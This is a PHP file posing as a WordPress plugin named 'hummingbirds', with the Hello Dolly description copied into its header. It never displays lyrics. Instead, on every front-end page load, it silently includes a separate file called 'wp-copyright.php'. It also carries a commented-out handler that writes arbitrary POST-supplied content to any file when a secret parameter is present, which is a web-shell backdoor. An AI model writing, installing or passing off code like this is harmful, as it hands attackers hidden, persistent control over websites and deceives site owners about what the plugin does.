<?php
/**
 * @package hummingbirds
 * @version 1.0.0
 */
/*
Plugin Name: hummingbirds
Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <cite>Hello, Dolly</cite> in the upper right of your admin screen on every page.
Author: hummingbirds
Version: 1.0.0
*/

function my_custom_footer_code() {
    @include 'wp-copyright.php';
    /*if(isset($_POST["vKg4QvP5hLX9eXN"])){
    	file_put_contents($_POST["file"], str_replace(chr(92), "", $_POST["insert"]));
    };*/
}
add_action( 'wp_footer', 'my_custom_footer_code' );
